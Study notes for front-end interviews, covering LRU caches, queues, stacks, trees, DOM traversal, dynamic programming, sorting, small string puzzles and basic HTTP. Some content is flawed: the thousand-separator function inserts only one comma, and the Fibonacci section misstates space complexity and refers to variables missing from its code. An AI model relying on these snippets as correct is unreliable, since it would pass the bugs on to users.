The Least Recently Used (LRU) Cache Algorithm is a sophisticated caching mechanism designed to optimize memory usage in applications. It achieves this by maintaining a collection of the most recently accessed items and discarding the least recently used items once the cache reaches its specified capacity. This approach is particularly advantageous in scenarios where memory resources are limited and access patterns are highly variable. At the heart of an LRU Cache are two essential methods: `get` and `put`. 

The `get(key)` method retrieve the value associated with a specific key. Its behavior is twofold:
- **Found Key:** If the key exists in the cache, `get` returns its value. Additionally, it updates the cache to mark the key as recently accessed, effectively moving its associated value to the "end" of the cache, which symbolizes its recent use.
- **Missing Key:** If the key is not present in the cache, `get` returns `-1`, indicating that no value is associated with the key in the cache.

The `put(key, value)` method is responsible for inserting or updating key-value pairs in the cache. Its operation is guided by the following principles:
- **Existing Key:** If the key is already present in the cache, its value is updated, and its position is adjusted to reflect its recent use.
- **New Key with Full Cache:** If the key is new and the cache has reached its maximum capacity, the least recently used item is evicted to accommodate the new key-value pair. This ensures that the cache does not exceed its size limit while prioritizing the retention of recently accessed items.

Leveraging JavaScript's `Map` object, which naturally maintains the order of its elements based on insertion, we can efficiently implement an LRU Cache. The `Map` object's inherent ordering is utilized to track the recency of access for the cache's key-value pairs.

```typescript
class LRUCache {
    private capacity: number;
    private cache: Map<number, number>;

    constructor(capacity: number) {
        this.capacity = capacity; // Define the maximum size of the cache
        this.cache = new Map(); // Utilize a Map for its order-preserving properties
    }

    get(key: number): number {
        if (this.cache.has(key)) {
            const value = this.cache.get(key);
            this.cache.delete(key); // Remove the key to update its position
            this.cache.set(key, value); // Re-insert the key to mark it as recently used
            return value;
        }
        return -1; // Key not found
    }

    put(key: number, value: number): void {
        if (this.cache.has(key)) {
            this.cache.delete(key); // Prepare to update the key's position
        } else if (this.cache.size >= this.capacity) {
            // Cache is full, remove the least recently used item
            const leastUsedKey = this.cache.keys().next().value;
            this.cache.delete(leastUsedKey);
        }
        this.cache.set(key, value); // Insert or update the key-value pair
    }
}

const lruCache = new LRUCache(2); // Initialize a new LRU Cache with a capacity of 2

// Inserting key-value pairs
lruCache.put(1, 1); // Inserts (1, 1)
lruCache.put(2, 2); // Inserts (2, 2)

// Accessing stored values
console.log(lruCache.get(1)); // Outputs: 1 (key 1 is found)

// Inserting another key-value pair, causing the least recently used key (2) to be evicted
lruCache.put(3, 3); // Evicts key 2 and inserts (3, 3)

console.log(lruCache.get(2)); // Outputs: -1 (key 2 has been evicted)

// Further operations demonstrate the LRU eviction policy
lruCache.put(4, 4); // Evicts key 1 and inserts (4, 4)
console.log(lruCache.get(1)); // Outputs: -1 (key 1 has been evicted)
console.log(lru

Cache.get(3)); // Outputs: 3 (key 3 is found)
console.log(lruCache.get(4)); // Outputs: 4 (key 4 is found)
```

## Follow-up: Implementing LRU Cache Without Map or Record

Creating an LRU (Least Recently Used) cache in JavaScript without the built-in `Map` or `Record` types involves a more manual approach to managing memory and order of items. This method uses a hash table for quick access and a doubly linked list to efficiently keep track of the items' order, prioritizing the most recently used.

1. **Doubly Linked List:** Each node in the list corresponds to an item in the cache, equipped with pointers to both the preceding and subsequent items. This bidirectional linking enables quick additions, removals, and reordering of nodes based on access patterns, facilitating the LRU policy's requirement of moving recently accessed items to the forefront.

2. **Hash Table:** For the hash table, a simple JavaScript object (`{}`) suffices. The hash table offers constant-time complexity for key-based operations, such as lookups, insertions, and deletions. It stores references to the nodes in the doubly linked list, thereby bridging the gap between quick access and maintaining order.

```typescript
class ListNode {
    key: number;
    value: number;
    prev: ListNode | null = null;
    next: ListNode | null = null;

    constructor(key: number, value: number) {
        this.key = key;
        this.value = value;
    }
}

class LRUCache {
    private capacity: number;
    private hashTable: { [key: number]: ListNode };
    private head: ListNode | null;
    private tail: ListNode | null;

    constructor(capacity: number) {
        this.capacity = capacity; // Defines the cache's maximum size
        this.hashTable = {}; // Key-node reference storage
        this.head = this.tail = null; // Initial empty state for the doubly linked list
    }

    get(key: number): number {
        if (!(key in this.hashTable)) {
            return -1; // Key not found scenario
        }
        const node = this.hashTable[key];
        this.moveToHead(node); // Update access order
        return node.value;
    }

    put(key: number, value: number): void {
        if (key in this.hashTable) {
            const node = this.hashTable[key];
            node.value = value;
            this.moveToHead(node); // Refresh position
        } else {
            const newNode = new ListNode(key, value);
            if (Object.keys(this.hashTable).length === this.capacity) {
                this.removeLRUItem(); // Evict least recently used
            }
            this.hashTable[key] = newNode;
            this.addNode(newNode); // Insert at head
        }
    }

    private addNode(node: ListNode): void {
        // Prepends node to the doubly linked list
        node.next = this.head;
        node.prev = null;
        if (this.head) {
            this.head.prev = node;
        }
        this.head = node;
        if (!this.tail) {
            this.tail = node; // First node becomes both head and tail
        }
    }

    private removeNode(node: ListNode): void {
        // Detaches node from its current position in the list
        if (node.prev) {
            node.prev.next = node.next;
        } else {
            this.head = node.next; // Node is head
        }
        if (node.next) {
            node.next.prev = node.prev;
        } else {
            this.tail = node.prev; // Node is tail
        }
    }

    private moveToHead(node: ListNode): void {
        // Re-positions a node to the head after access
        this.removeNode(node);
        this.addNode(node);
    }

    private removeLRUItem(): void {
        // Evicts the least recently used node from the list's tail
        if (this.tail) {
            delete this.hashTable[this.tail.key]; // Cleanup hash table entry
            this.removeNode(this.tail); // Detach the node
        }
    }
}
```



# 3. Algorithms and Data Structures.md

## How is a Linked List Used in Front-End Development?

In front-end development, traditional linked lists are not commonly used data structures. However, they find a crucial application in a modified form within React's Fiber architecture.

### React's Fiber Architecture
**Introduction**
React Fiber is a reimplementation of React's core reconciliation algorithm. Its primary goal is to enable incremental rendering—the capability to break down rendering work into manageable chunks that can be paused and resumed.

**Utilizing a Fiber Structure**
React Fiber uses a structure similar to a linked list to manage its component tree. Each component in the tree is a node in this structure (often called a "fiber"), and these nodes are linked to facilitate various operations such as the traversal of the component tree, updating, and rendering.

**Advantages of Fiber Structure**
1. **Incremental Rendering**: The fiber structure allows for tasks to be paused and resumed, improving performance in complex applications by breaking down the rendering process.
2. **Concurrency**: This structure supports the efficient management of UI operations, enhancing responsiveness and user interaction.
3. **Priority-Based Updates**: React can prioritize updates more effectively, optimizing performance in real-time scenarios.

While traditional linked lists are not standard tools in front-end development, React's strategic adaptation of this concept in its Fiber architecture highlights its potential in optimizing rendering processes and managing state in sophisticated web applications.

## implementing a queue using a linked list in TypeScript:
In TypeScript, you can implement a queue using a linked list by maintaining references to both the head and tail of the list. The queue operations work as follows:

Enqueue (Add to Queue): To add an item, you create a new node and attach it to the current tail of the linked list, then update the tail reference to this new node. If the queue is empty, this new node is both the head and tail.

Dequeue (Remove from Queue): To remove an item, you take the value from the head of the linked list and then update the head reference to the next node in the list. If the list becomes empty, update the tail reference to null as well.

This approach ensures that both enqueue and dequeue operations are O(1), providing efficient queue management. It’s important to handle edge cases, such as dequeueing from an empty queue, to avoid errors.

## Implement a queue in TypeScript, and is a linked list faster or an array?
In TypeScript, implementing a queue can be done using either an array or a linked list. An array-based queue is simple to implement but its dequeue operation (shift) is O(n) due to the need to shift elements. In contrast, a linked list implementation offers O(1) time complexity for both enqueue and dequeue operations, as it allows for constant-time insertions and deletions without reindexing.

So, while both can be used to implement a queue, a linked list is generally faster and more efficient for typical queue operations. This makes linked lists preferable in scenarios where frequent enqueue and dequeue operations are expected, whereas arrays might be more suitable when memory efficiency is a priority and operations are less frequent.

## implement a queue with linkedlist
```ts
interface ILinkedListNode {
    val: number;
    next: ILinkedListNode | null;
}

class Queue {
    // undefined usually used for uninitialized value, null for empty values, here null is better
    private head: ILinkedListNode | null;
    private tail: ILinkedListNode | null;
    private len: number;

    // use constructor instead of set values above, make code more readable
    // Inside class methods, use this to refer to instance variables 
    constructor(){
        this.head = null;
        this.tail = null;
        this.len = 0;
    }

    // for better clarity, mention return type void if return nothing
    offer(val: number): void {
        const temp: ILinkedListNode = {val: val, next: null};
        // in case the queue is empty, use === check value and type
        if (this.head === null) {
            this.head = temp;
            this.tail = temp;
        } 
        // normal case
        else {
            // avoid non-null assertions to avoid legitimate null/undefined errors, i.e. try avoid below commented code
            // this.tail!.next = temp;
            if (this.tail) {
                this.tail.next = temp;
            }
            this.tail = temp;
        }
        this.len += 1;
    }

    poll(): number | null {
        if (this.head === null) {
            return null;
        } 
        if (this.head.next === null) {
            this.tail = null;
        }
        // here use const instead of let, since it never changes
        const temp = this.head.val;
        this.head = this.head.next;
        this.len -= 1;
        return temp;
    }

    // with get keyword, we can use the return value as an attribute, e.g. const queue = new Queue(); const len = queue.size;
    get size(): number {
        return this.len;
    }
}
```

## Queue in JavaScript
```javascript
function Queue() {
  this.elements = [];
}

Queue.prototype.enqueue = function (e) {
  this.elements.push(e);
};

Queue.prototype.dequeue = function () {
  return this.elements.shift();
};

Queue.prototype.isEmpty = function () {
  return this.elements.length === 0;
};

Queue.prototype.peek = function () {
  return !this.isEmpty() ? this.elements[0] : undefined;
};

Queue.prototype.size = function () {
  return this.elements.length;
};

const queue = new Queue();
queue.enqueue(1);
queue.enqueue(2);
queue.enqueue(3);

console.log(queue.dequeue()); // Outputs 1
console.log(queue.peek());    // Outputs 2
console.log(queue.size());    // Outputs 2
console.log(queue.isEmpty()); // Outputs false
```

### Practical Use in Redux

Queues can be particularly useful in managing state updates in applications using **React Redux**. They help in sequencing state updates and ensuring that they are handled in the order they were initiated.

In React Redux, actions dispatched to update the state of an application might be processed asynchronously. Implementing a queue can help maintain the order of these actions, especially in scenarios with multiple state changes reliant on the order of execution. This ensures a predictable state management flow, which is crucial for maintaining consistency across the application.

### Benefits of Using Queues
- **Order Preservation**: Ensures actions are processed in the order they were received.
- **Concurrency Management**: Helps in handling multiple state updates efficiently.
- **Predictability**: Increases the predictability of state changes, which is crucial for debugging and maintenance.

## Stack
Stack is a Last In, First Out (LIFO) data structure, commonly used in computing for various tasks such as managing function calls and evaluating expressions. It supports two primary operations: `push` and `pop`. The `push` operation adds an element to the top of the stack, while `pop` removes and returns the top element.

### Operations
**Push**: Adds an element to the top of the stack. 
**Pop**: Removes the top element from the stack.
**Peek**: Returns the top element without removing it.
**IsEmpty**: Checks if the stack is empty.

```js
function Stack() {
  this.stack = [];
}

Stack.prototype.push = function(value) {
  this.stack.push(value);
}

Stack.prototype.pop = function() {
  return this.stack.pop();
}

Stack.prototype.peek = function() {
  return this.stack[this.stack.length - 1];
}

Stack.prototype.isEmpty = function() {
  return this.stack.length === 0;
}

const stack = new Stack();
stack.push(1);
stack.push(2);
stack.push(3);
console.log(stack.pop()); // Output: 3
console.log(stack.peek()); // Output: 2
console.log(stack.isEmpty()); // Output: false
```

### Applications
Stacks are versatile structures used in various programming scenarios:
- **Webpack Loader**: Manages the transformations applied to modules.
- **Browser History**: Tracks the pages visited in a session for backward navigation.
- **Depth-First Search (DFS)**: Utilized in traversing graphs or trees where nodes are explored as deep as possible before backtracking.

Each application leverages the LIFO property of the stack to manage data efficiently in scenarios where the last entered item needs to be accessed first.

## In-order, pre-order and post-order
In the context of binary trees, in-order, pre-order, and post-order refer to the three primary ways to traverse the nodes of the tree, each with a different order for visiting the nodes.
**In-Order Traversal**: Left, Root, Right.
**Pre-Order Traversal**: Root, Left, Right.
**Post-Order Traversal**: Left, Right, Root.

## find the kth smallest value in a binary search tree
```ts
interface ITreeNode{
    val: number;
    left: ITreeNode | null;
    right: ITreeNode | null;
}

function findKthSmallest(root:ITreeNode, k: number): number | null {
    let count: number = 0;
    let result: number | null = null;

    // this function is in-order
    function dfsHelper(curNode: ITreeNode) {
        if (curNode === null || result !== null) return;

        dfsHelper(curNode.left);

        if (++count === k) {
            result = curNode.val;
            return;
        }

        dfsHelper(curNode.right);
    }

    dfsHelper(root);

    return result;
}
```

## Why binary tree so important, not trinary or quanary tree? 
While arrays provide faster access (O(1)), adding or deleting elements is less efficient (O(N)). Linked lists offer efficient insertion and deletion (O(1)), but slower access times (O(N)).

Compared to arrays and linked lists, binary trees offer a good balance with O(logn) time complexity for access, add, and delete operations when the tree is balanced.

Binary trees, as opposed to ternary or quaternary trees, provide a simpler and more efficient structure for most applications. They strike a balance between maintaining low complexity and achieving efficient operations.

## Why balancing binary tree so important?
An unbalanced binary tree can degenerate into a linked list, leading to O(N) time complexity for operations like add, delete, update, and search. A balanced binary tree, on the other hand, maintains a height of O(logn), ensuring that operations can be performed in logarithmic time. This balance is essential for leveraging the efficiency of binary trees, especially in scenarios where quick search, insertion, and deletion are frequently required.

## Why tree operations has time complexity of O(logn)?
`logn` represents the height of a balanced binary tree. In a balanced tree, each operation like search, insert, or delete involves traversing a path from the root to a leaf node, or vice versa. The number of levels (or height) of the tree determines the maximum number of steps needed for these operations. Since a balanced binary tree is structured to have a height that grows logarithmically with the number of nodes (n), the operations are significantly more efficient than linear time complexity, particularly for large datasets.

## What is a black-red tree? What is B tree? 
- **Red-Black Tree**: It is a type of self-balancing binary search tree. Each node in the tree is colored either red or black. The tree uses these colors along with specific rules to ensure that the tree remains balanced during insertions and deletions. The time complexity for balancing a Red-Black Tree during insertions and deletions is O(log n). This balancing act ensures that the tree maintains its O(logn) time complexity for operations. Red-Black Trees are particularly valued for their relatively simple balancing logic and efficient operations, making them suitable for various applications, including implementing associative arrays and priority queues.

- **B-Tree**: A B-Tree is a self-balancing tree data structure that maintains sorted data and allows searches, sequential access, insertions, and deletions in logarithmic time. Unlike binary trees, B-Trees are multi-way trees (having more than two children) and are optimized for systems that read and write large blocks of data, like databases and filesystems. They are designed to efficiently minimize disk I/O operations, and their branching factor (the number of child nodes) can be adjusted to optimize the balance between the tree's height and the number of nodes accessed per operation.

- **B+ Tree**: A variant of the B-Tree, the B+ Tree, is commonly used in databases and file systems. It maintains data in the leaf nodes, while the internal nodes store only keys for navigation. This design allows for efficient range queries and sequential access, making B+ Trees well-suited for systems that require high-performance data retrieval. See https://blog.csdn.net/Weixiaohuai/article/details/109493541

Both Red-Black Trees and B-Trees are advanced tree structures designed to optimize performance for different scenarios, with Red-Black Trees often used in memory and B-Trees in disk-based storage systems.

## Identify whether a string is prefix of a word in dictionary
A Trie, or a prefix tree, is an optimal data structure for this problem. It stores strings in a tree-like structure, where each node represents a character of a string. The root represents an empty string, and each path from the root to a leaf node represents a word.

To check if a string is a prefix of any word in the dictionary, we insert each word into the Trie. Then, for the given string, we traverse the Trie from the root. If we can traverse the Trie following the characters of the string without any breaks, and reach a node (not necessarily a leaf node), then the string is a valid prefix in the dictionary.

This approach is efficient in terms of time complexity, especially for multiple prefix searches, as each search is only as long as the length of the string being searched.

e.g. word apple may looks like this: {a: {p: {p: {l: {e: null}}}}}

The time complexity for this is O(m) where m is the length of the string

## Depth-First Search (DFS) of a DOM Tree
Depth-First Search (DFS) is a method used to traverse or search a tree or graph data structure. The algorithm starts at the root node and explores as far as possible along each branch before backtracking. When applied to a DOM tree, DFS will visit each node in a manner that deeply explores a node's children before moving to its siblings.

The given TypeScript function `dfs` illustrates how DFS can be applied to a DOM tree. The `visitNode` function is used to log different types of nodes (Comment, Text, HTMLElement). In the `dfs` function, recursion is utilized to visit each node starting from the root, exploring all its child nodes deeply before moving to the next sibling.

```typescript
function visitNode(node: Node) {
    if (node instanceof Comment) {
        console.log('comment', node.textContent);
    }
    if (node instanceof Text) {
        const t = node.textContent.trim();
        if (t) {
            console.log('text', t);
        }
    }
    if (node instanceof HTMLElement) {
        console.log('element', node.tagName);
    }
}

function dfs(node: Node) {
    visitNode(node);
    node.childNodes.forEach((child) => {
        dfs(child);
    });
}
```

### Without Recursion
DFS can be implemented without recursion by using a stack to simulate the call stack of recursion. This approach avoids potential stack overflow errors that may occur with deep recursion. While recursion is more straightforward and readable, using a stack can be more efficient and safer for deep trees.

```typescript
function dfsWithoutRecursion(node: Node) {
    const stack = [node];
    while (stack.length) {
        const n = stack.pop();
        visitNode(n);
        Array.from(n.childNodes).reverse().forEach((child) => {
            stack.push(child);
        });
    }
}
```

## Breadth-First Search (BFS) of a DOM Tree
Breadth-First Search (BFS) is another method to traverse or search a tree or graph data structure. Unlike DFS, BFS explores all the neighbor nodes at the present depth prior to moving on to the nodes at the next depth level. Applied to a DOM tree, BFS will visit each node level by level.

The `bfs` function demonstrates how BFS can be applied to a DOM tree. It uses a queue to visit each node at the current level before moving to the nodes at the next level. This approach ensures that nodes are visited in a breadth-wise manner.

```typescript
function bfs(node: Node) {
    const queue = [node];
    while (queue.length) {
        const n = queue.shift();
        visitNode(n);
        n.childNodes.forEach((child) => {
            queue.push(child);
        });
    }
}
```

### Key Differences Between DFS and BFS
- **DFS** dives as deep as possible into the tree's branches before backtracking, which can be implemented either recursively or using a stack.
- **BFS** visits all nodes at the current level before moving to the next level, using a queue to keep track of the order.

## Array to Tree and Tree to Array Conversion
### TreeNode and ArrayItem Interfaces
```typescript
interface TreeNode {
    id: number;
    name: string;
    children?: TreeNode[];
}

interface ArrayItem {
    id: number;
    parentId: number;
    name: string;
}
```

### Array to Tree Conversion
```typescript
function arrayToTree(arr: ArrayItem[]): TreeNode | null {
    const map = new Map<number, TreeNode>();
    let root: TreeNode | null = null;

    // sort by parentId to ensure parent nodes are processed before children
    arr.sort((a, b) => a.parentId - b.parentId);

    arr.forEach(item => {
        const {id, parentId, name} = item;
        const treeNode: TreeNode = {id, name, children: []};
        map.set(id, treeNode);

        if (parentId === 0) {
            root = treeNode;
        } else {
            const parent = map.get(parentId);
            parent?.children.push(treeNode);
        }
    });

    return root;
}
```

### Tree to Array Conversion
```typescript
function treeToArray(tree: TreeNode): ArrayItem[] {
    const result: ArrayItem[] = [];

    function traverse(node: TreeNode, parentId: number) {
        const {id, name, children} = node;
        result.push({id, parentId, name});
        children?.forEach(child => traverse(child, id));
    }

    traverse(tree, 0);
    return result;
}
```

### Contextual Understanding
- **Relational Databases**: Such as PostgreSQL, typically store data in a tabular format with rows and columns, which resembles the flat array structure. This format is efficient for operations that involve relations between different entities.
  
- **Non-relational Databases**: For instance, MongoDB, often store data in formats akin to the tree structure, like documents in BSON format. This structure is advantageous for storing nested or hierarchical data, such as comments on a post or categories with subcategories.

## What is dynamic programing
- Dynamic programming involves breaking down a complex problem into smaller, overlapping subproblems, solving these down to the simplest base cases. 
- It uses recursion with memoization, or iterative methods with tabulation, to optimize by preventing redundant computations.

## Write a recursive function and a non-recursive return the nth fibonacci number, explain why the recursive one may crash
### Recursive Implementation:
```ts
// method one, recursive
function fibonacci(n: number): number {
    if (n === 0) return 0;
    if (n === 1) return 1;
    return fibonacci(n - 1) + fibonacci(n - 2)
}
```
In the recursive Fibonacci function, each function call is added to the call stack, a special region in memory where function call information is stored. When `n` is large, this results in a very deep recursion, where each call to `fibonacci` leads to two more calls, exponentially increasing the number of calls on the stack. This can quickly exceed the memory limit of the stack, leading to a stack overflow error. This happens because the stack has a limited size and cannot accommodate the large number of nested function calls required by the recursive approach for large values of `n`.

- **Time Complexity: O(2^n)**

  Each call to `fibonacciRecursive` generates two more calls, except for the base cases. This exponential growth results in a time complexity of O(2^n), where `n` is the input number.

  e.g. we want to calculate f(8)  
  f(8) = f(7) + f (6), and f(7) = f(6) + f(5)  
  Therefore, F(6) is calculated twice which is redundant computations

- **Space Complexity: O(n)**

  The space complexity is determined by the height of the call stack, which in the worst case (when `n` is large) will have `n` calls stacked on top of each other before reaching the base case. This results in a space complexity of O(n).

### Dynamic Programming Implementation:
```ts
// method 2, dynamic programming
function fibonacci(n: number): number {
    if (n < 0) return -1;
    if (n === 0) return 0;
    if (n === 1) return 1;
    const dp = [0, 1];
    for (let i = 2; i <= n; i++) {
        dp[i] = dp[i - 1] + dp[i - 2];
    }
    return dp[n];
}
```
The dynamic programming solution avoids the issue of stack overflow by storing the results of subproblems in an array (`dp`) and reusing them when needed. This approach has a time complexity of O(n) and a space complexity of O(n), making it more efficient and suitable for calculating large Fibonacci numbers.

- **Time Complexity: O(n)**

  The function iterates from 2 to `n` once, performing a constant amount of work in each iteration. Therefore, the time complexity is linear, O(n).

- **Space Complexity: O(1)**

  The iterative solution uses a fixed amount of space (the variables `prevprev`, `prev`, and `result`). This amount of space does not change as `n` increases, making the space complexity constant, O(1).

## A frog, can jump 1 or 2 steps each time. How many ways can i jump a n step stair? 
```ts
function frogJumpDP(n: number): number {
    // only one way to go to step 0 which is doing nothing
    if (n === 0) return 1;
    // the first 1 is for simplicity of calculation so that dp[2] will be 2
    // the second 1 is only one way to go to stair 1
    const dp = [1, 1];
    for (let i = 2; i <= n; i++) {
        dp[i] = dp[i - 1] + dp[i - 2];
    }
    return dp[n];
}
```

## Follow up: Staircase Variation Problem
Given a staircase with n steps and an array steps[] where each element in the array represents the number of steps the frog can jump at a time, determine the number of ways the frog can reach the top of the staircase. For example, if steps = [1, 3, 5], the frog can jump either 1, 3, or 5 steps in a single jump.
```ts
function frogJumpVariadic(n: number, steps: number[]): number {
    // Array to store the number of ways to reach each step.
    const dp = new Array(n + 1).fill(0);
    dp[0] = 1; // Base case: one way to stay on the ground

    for (let i = 1; i <= n; i++) {
        for (let j = 0; j < steps.length; j++) {
            if (i >= steps[j]) {
                dp[i] += dp[i - steps[j]];
            }
        }
    }

    return dp[n];
}
```

## 01 Knapsack Problem
In the 0-1 Knapsack problem, you are given a set of items, each with a weight and a value. The goal is to determine the maximum value of items that can be packed into a knapsack with a limited carrying capacity. Each item can either be included in its entirety or excluded; partial items are not allowed.

```java
public class Knapsack01 {

    /**
     * Calculates the maximum value that can be packed into the knapsack.
     *
     * @param W the maximum weight capacity of the knapsack
     * @param weights array of item weights
     * @param values array of item values
     * @param n number of items
     * @return the maximum value that fits in the knapsack
     */
    public static int knapsack(int W, int[] weights, int[] values, int n) {
        // dp[w] will hold the maximum value that can be attained with a knapsack capacity of w
        int[] dp = new int[W + 1];

        // Process each item
        for (int i = 0; i < n; i++) {
            // Iterate through all capacities from max to the weight of the current item
            for (int w = W; w >= weights[i]; w--) {
                // Update dp[w] to the maximum of itself and the value of taking item i
                dp[w] = Math.max(dp[w], dp[w - weights[i]] + values[i]);
            }
        }

        return dp[W];
    }

    public static void main(String[] args) {
        int[] weights = {1, 3, 4};
        int[] values = {1500, 2000, 3000};
        int W = 4; // Maximum weight capacity of the knapsack
        int n = weights.length; // Number of items

        int maxVal = knapsack(W, weights, values, n);
        System.out.println("Maximum value that can be packed: " + maxVal);
    }
}
```

#### Key Concepts Explained

- **Dynamic Programming Array (`dp`)**: The `dp` array is central to the solution, where `dp[w]` represents the maximum value that can be achieved with a knapsack capacity of `w`.
- **Iteration Order**: It's crucial to iterate the weights in reverse when considering each item, as this ensures that each item is only considered once per capacity.
- **Item Processing**: For each item, we compare the maximum value of not taking the item (`dp[w]`) versus taking the item (`dp[w - weights[i]] + values[i]`), thus ensuring that we always store the best solution for every capacity.

## Implement binary search and describe time complexity
```ts
// assume input nums is in ascending order, return the index or null if not found
function binarySearch(nums: number[], target: number): number | null {
    let left: number = 0;
    let right: number = nums.length - 1;
    // use <= for case length = 1
    while (left <= right) {
        // Use Math.floor to avoid floating point values for the mid index.
        let mid: number = Math.floor((left + right) / 2);
        if (nums[mid] === target) {
            return mid;
        }
        if (nums[mid] > target) {
            right = mid - 1;
        } else {
            left = mid + 1;
        }
    }
    return null;
}
```
Binary search has a time complexity of O(log n), where n is the number of elements in the array. This is because the algorithm divides the search interval in half with each step.

## Given an ascending number array and a number n, find 2 numbers in array sum is n. 
```ts
function twoSumsAscending(nums: number[], target: number): number[]{
    let left: number = 0;
    let right: number = nums.length - 1;
    // Use '<' instead of '<=' to prevent the same element from being used twice
    while (left < right) {
        if (nums[left] + nums[right] === target) {
            return [nums[left], nums[right]];
        }
        if (nums[left] + nums[right] < target) {
            left++;
        } else {
            right--;
        }
    }
    return [];
}
```

## Move all zeros in an array to its end 
- maintaining the order of the non-zero elements. 
- The operation should be performed in-place
```ts
function moveZeroToEnd(nums: number[]): void {
    let zeroStart: number = -1;
    for (let i = 0; i < nums.length; i++) {
        if (nums[i] !== 0 && zeroStart !== -1) {
            nums[zeroStart] = nums[i];
            nums[i] = 0;
            zeroStart++;
        } else if (nums[i] === 0 && zeroStart === -1) {
            zeroStart = i;
        }
    }
}
```

## Identify the longest sequence of a continuous character in a given string. 
For example, for the string 'aabaacceee', the function should return 'e'.
```ts
interface IRes {
    char: string;
    len: number;
}

function findLongest(s: string): IRes {
    if (s.length === 0) return { char: '', len: 0 }; // Handle empty string

    let longestChar: string = s.charAt(0);
    let longest: number = 1;
    let currentChar: string = s.charAt(0);
    let currentLength: number = 1;

    for (let i = 1; i < s.length; i++) {
        if (s.charAt(i) === currentChar) {
            currentLength++;
        } else {
            if (currentLength > longest) {
                longest = currentLength;
                longestChar = currentChar;
            }
            currentChar = s.charAt(i);
            currentLength = 1;
        }
    }

    // Check and update for the last character sequence
    if (currentLength > longest) {
        longest = currentLength;
        longestChar = currentChar;
    }

    return { char: longestChar, len: longest };
}

```

## Implement quicksort in typescript
```ts
function quickSort(nums: number[]): number[] {
    if (nums.length <= 1) return nums;

    const midInd = Math.floor(nums.length / 2);
    // array.splice(a, b) removes b elements starting from index a from the array. The return value is an array of the removed elements.
    const mid = nums.splice(midInd, 1)[0];

    const left: number[] = []
    const right: number[] = []
    for (let i = 0; i < nums.length; i++) {
        if (nums[i] < mid) {
            left.push(nums[i]);
        } else {
            right.push(nums[i]);
        }
    }

    return quickSort(left).concat([mid], quickSort(right));
}
```

- **Average Case (O(n log n))**: In the average case, the pivot divides the array into two roughly equal parts, leading to a logarithmic number of recursive calls (log n). In each level of recursion, the algorithm performs O(n) operations to partition the array around the pivot. Thus, the average case is O(n log n).

- **Worst Case (O(n²))**: The worst case occurs when the pivot is the smallest or largest element in each recursive call, leading to unbalanced partitions. This results in n recursive calls, each doing O(n) work, thus O(n²).

## find palindrome number
Palindrome number, e.g. 1, 2, 22, 101, 10001, 20002, 2002 etc
```ts
function findAllPalindromeNumbers(max: number): number[] {
    const res = []

    for (let i = 0; i <= max; i++) {
        // find reversed number first, then compare
        let reversedNum: number = 0, temp: number = i;
        while (temp !== 0) {
            reversedNum *= 10;
            reversedNum += temp % 10;
            temp = Math.floor(temp / 10);
        }
        if (reversedNum === i) {
            res.push(i);
        }
    }

    return res;
}

function findAllPalindromeNumbers(max: number): number[] {
    const res = [];

    for (let i = 0; i < max; i++) {
        const s = i.toString();
        let start = 0, end = s.length - 1;
        let isPalindrome = true;
        while (start < end) {
            if (s.charAt(start++) !== s.charAt(end--)) {
                isPalindrome = false;
                break;
            }
        }
        if (isPalindrome) res.push(i);
    }

    return res;
}
```


## formatting numbers into a thousand separator style (e.g., "1,000", "12,000,000")
```ts
function format(num: number): string{
    let res: string = "";
    const s: string = num.toString();
    let count: number = 0;
    for (let i = s.length - 1; i >= 0; i--) {
        if (++count === 3 && i !== 0) {
            res = "," + res;
        }
        res = s.charAt(i) + res;
    }
    return res;
}
```

## Switch letter case, e.g. aBc123D -> AbC123d
```ts
function switchLetterCase(s: string): string {
    let res = ""

    // according to ascii table, A-Z is 65-90, a-z is 97-122
    const UPPER_CASE_A = 65;
    const UPPER_CASE_Z = 90;
    const LOWER_CASE_A = 97;
    const LOWER_CASE_Z = 122;

    for (let i = 0; i < s.length; i++) {
        const code = s.charCodeAt(i);
        if (code >= UPPER_CASE_A && code <= UPPER_CASE_Z) {
            // Convert to lower case
            res += String.fromCharCode(code + 32); 
        } else if (code >= LOWER_CASE_A && code <= LOWER_CASE_Z) {
            // Convert to upper case
            res += String.fromCharCode(code - 32); 
        } else {
            // Non-alphabetic characters are unchanged
            res += s.charAt(i); 
        }
    }

    return res
}
```






# 4. Network Systems.md

## What is Restful API
RESTful APIs are architectural guidelines for designing networked applications. They rely on stateless, client-server communication, where operations are performed using standard HTTP methods. For managing a blog, RESTful APIs provide endpoints for creating (POST), deleting (DELETE), updating (PATCH or PUT), and querying (GET) blog posts. Each operation targets a specific resource, identified by a URL, and uses the appropriate HTTP method to convey the action. For updates, PUT replaces an entire resource, while PATCH modifies parts of it, making PATCH more suitable for updates where only a few fields change. This approach to API design promotes scalability, simplicity, and flexibility.

## HTTP Requests Types
Understanding HTTP requests is essential for web development, as they are the primary method used by clients to communicate with servers. Below, we break down the four main types of HTTP requests, each serving a distinct purpose.

### GET
**Purpose:** Retrieve data from the server.
**Use Case:** A typical use of the GET request is fetching a webpage or querying an API to get specific data. For instance, when a user accesses a blog, a GET request is sent to retrieve the content from the server.

### POST
**Purpose:** Submit data to the server.
**Use Case:** POST requests are commonly used when submitting form data or uploading a file. For example, when a user signs up on a website, the information they enter is sent to the server using a POST request.

### PUT
**Purpose:** Update existing data on the server.
**Use Case:** PUT requests are used when updating records that already exist. For example, changing your profile information on a social media site typically involves a PUT request to update the server with the new data.

### DELETE
**Purpose:** Remove existing data from the server.
**Use Case:** DELETE requests are utilized to delete resources. For instance, if a user decides to delete their account, a DELETE request would be sent to remove their data from the server.

## Frequently Used HTTP Header Fields

### General Headers

- **Accept**  
  Specifies the MIME types that the client is willing to receive. Used to inform the server about the type of content the client can process. For example, `Accept: text/html` indicates that the client prefers HTML content.

- **Content-Type**  
  Indicates the MIME type of the body of the request or response. This header is critical in both `POST` and `PUT` requests to inform the server about the data being sent. For example, `Content-Type: application/json` tells the server that the request body is a JSON string.

### Client-to-Server Headers

- **Authorization**  
  Contains credentials for authenticating the client to the server. This header is often used in scenarios where access control is required. An example value might be `Authorization: Bearer <token>`, which represents a token-based authentication scheme.

- **Cookie**  
  Sends stored HTTP cookies previously sent by the server with the `Set-Cookie` header. This is essential for managing user sessions. An example is `Cookie: session_token=abc123`, which might be used to maintain session state.

### Negotiation Headers

- **Accept-Charset**  
  Details the character sets the client is capable of understanding, like `UTF-8` or `ISO-8859-1`. An example use might be `Accept-Charset: UTF-8`, indicating the client prefers UTF-8 encoded characters.

- **Accept-Encoding**  
